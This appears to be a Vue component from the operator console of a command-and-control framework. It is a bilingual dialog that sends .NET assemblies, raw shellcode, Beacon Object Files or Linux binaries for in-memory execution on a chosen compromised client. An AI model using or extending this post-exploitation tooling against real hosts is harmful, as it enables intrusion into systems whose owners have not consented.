<template>
  <el-dialog
    v-model="visible"
    :title="i18nStore.tl('内存执行', 'Memory Execute')"
    width="540px"
    :close-on-click-modal="false"
    append-to-body
    class="cs-dialog"
  >
    <div class="cs-dialog-body">
      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('目标客户端:', 'Target:') }}</label>
        <span class="dialog-val cs-font-mono">{{ clientLabel }}</span>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('执行模式:', 'Mode:') }}</label>
        <el-select v-model="execMode" size="small" class="cs-form-input">
          <el-option v-for="m in modeOptions" :key="m.value" :label="m.label" :value="m.value" />
        </el-select>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('载荷文件:', 'Payload File:') }}</label>
        <div class="dialog-file-row">
          <el-upload
            :auto-upload="false"
            :limit="1"
            :on-change="onFileChange"
            :on-remove="onFileRemove"
            :on-exceed="onFileExceed"
          >
            <button type="button" class="cs-btn">{{ i18nStore.tl('选择文件', 'Select File') }}</button>
          </el-upload>
          <span v-if="selectedFile" class="dialog-hint cs-font-mono">{{ selectedFile.name }} ({{ (selectedFile.size / 1024).toFixed(1) }} KB)</span>
          <span v-else class="dialog-hint">{{ fileHint }}</span>
        </div>
      </div>

      <div class="cs-form-row">
        <label class="cs-form-label">{{ i18nStore.tl('参数:', 'Arguments:') }}</label>
        <el-input v-model="args" size="small" class="cs-form-input" :placeholder="i18nStore.tl('可选执行参数', 'Optional arguments')" />
      </div>
    </div>

    <template #footer>
      <div class="cs-dialog-footer">
        <button class="cs-btn cs-btn-primary" :disabled="submitting || !selectedFile" @click="doExecute">
          {{ submitting ? (i18nStore.tl('下发中...', 'Sending...')) : (i18nStore.tl('执行', 'Execute')) }}
        </button>
        <button class="cs-btn" @click="close">{{ i18nStore.tl('取消', 'Cancel') }}</button>
      </div>
    </template>
  </el-dialog>
</template>

<script setup lang="ts">
import { computed, ref, watch } from 'vue'
import { useRouter } from 'vue-router'
import { ElMessage, type UploadFile } from 'element-plus'
import { useClientsStore } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
import ClientAPI from '@/api/clients'

const router = useRouter()
const clientsStore = useClientsStore()
const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const props = withDefaults(defineProps<{ modelValue: boolean; uid?: string; mode?: string }>(), { uid: '', mode: 'execute-assembly' })
const emit = defineEmits<{ (e: 'update:modelValue', value: boolean): void }>()
const visible = computed({
  get: () => props.modelValue,
  set: (value) => emit('update:modelValue', value),
})

const uid = computed(() => props.uid)
const client = computed(() => clientsStore.getClientByUid(uid.value))
const clientLabel = computed(() => {
  if (!client.value) return uid.value.slice(0, 8)
  return `${client.value.Username || 'user'}@${client.value.Computer || 'host'}`
})

const modeOptions = [
  { value: 'execute-assembly', label: 'execute-assembly (.NET Assembly)' },
  { value: 'inline-bin', label: 'inline-bin (Donut 转 Shellcode)' },
  { value: 'shellcode-inject', label: 'shellcode-inject' },
  { value: 'bof', label: 'bof (COFF Beacon Object)' },
  { value: 'script', label: 'script (Linux Shell 脚本)' },
  { value: 'binary', label: 'binary (Linux 二进制)' },
  { value: 'exec-file', label: 'exec-file (文件执行)' },
]

const execMode = ref('execute-assembly')
const args = ref('')
const selectedFile = ref<File | null>(null)
const submitting = ref(false)

const fileHint = computed(() => {
  switch (execMode.value) {
    case 'execute-assembly': return isZh.value ? '选择 .NET 程序集 (exe/dll)' : 'Select .NET assembly (exe/dll)'
    case 'inline-bin': return isZh.value ? '选择可转换 Shellcode 的 PE (exe/dll)' : 'Select a PE convertible to shellcode'
    case 'shellcode-inject': return isZh.value ? '选择原始 Shellcode 文件' : 'Select raw shellcode file'
    case 'bof': return isZh.value ? '选择 BOF 目标文件 (COFF)' : 'Select BOF object file (COFF)'
    case 'script': return isZh.value ? '选择 Linux Shell 脚本 (sh)' : 'Select Linux shell script (sh)'
    case 'binary': return isZh.value ? '选择 Linux 二进制文件 (ELF)' : 'Select Linux binary (ELF)'
    case 'exec-file': return isZh.value ? '选择可执行文件 (Windows .exe / Linux ELF)' : 'Select executable (Windows .exe / Linux ELF)'
    default: return ''
  }
})

watch(
  visible,
  (val) => {
    if (val) {
      execMode.value = props.mode || 'execute-assembly'
      args.value = ''
      selectedFile.value = null
    }
  },
)

function onFileChange(file: UploadFile) {
  selectedFile.value = (file.raw as File) || null
}

function onFileRemove() {
  selectedFile.value = null
}

function onFileExceed() {
  ElMessage.warning(isZh.value ? '仅支持选择一个文件' : 'Only one file allowed')
}

function close() {
  visible.value = false
}

async function doExecute() {
  if (!uid.value) return
  if (!selectedFile.value) {
    ElMessage.warning(isZh.value ? '请先选择载荷文件' : 'Select a payload file first')
    return
  }
  submitting.value = true
  try {
    const res = await ClientAPI.execute_bin(uid.value, selectedFile.value, args.value.trim(), execMode.value)
    if (res.status === 200 && res.data && res.data.status === 200) {
      ElMessage.success(isZh.value ? `已下发 ${execMode.value} 执行请求` : `${execMode.value} execution dispatched`)
      close()
      // 跳转到 Beacon 控制台：后端已把 `$ mode file args` 写入 shell 历史，控制台 3s 轮询自动回显
      router.push(`/client/${uid.value}/console`)
    } else {
      const msg = res.data?.data || res.data?.error || (isZh.value ? '执行失败' : 'Execution failed')
      ElMessage.error(String(msg))
    }
  } catch (err: any) {
    console.error('内存执行失败:', err)
    ElMessage.error(err instanceof Error ? err.message : (isZh.value ? '执行失败' : 'Execution failed'))
  } finally {
    submitting.value = false
  }
}
</script>

<style scoped>
.dialog-val {
  font-size: 13px;
  color: var(--cs-text-bright);
}
.dialog-file-row {
  flex: 1;
  display: flex;
  align-items: center;
  gap: 10px;
}
.dialog-hint {
  font-size: 12px;
  color: var(--cs-text-dim);
}
.cs-dialog-footer {
  display: flex;
  justify-content: flex-end;
  gap: 12px;
}
</style>
